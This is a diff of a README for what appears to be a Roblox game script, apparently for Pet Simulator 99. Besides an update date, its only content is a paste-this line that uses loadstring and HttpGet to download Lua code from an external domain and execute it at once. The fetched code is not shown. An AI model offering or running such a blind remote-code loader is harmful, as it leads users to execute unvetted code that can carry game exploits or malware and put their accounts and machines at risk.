@@ -1,5 +1,5 @@
 # PS99-new-script-RNG-upd
-
+Script updated for new update 2024-08-24
 # SCRIPT:
 
 **loadstring(game:HttpGet("https://egorikusa.space/f317bd388d37d722f2a04c27.lua", true))()**
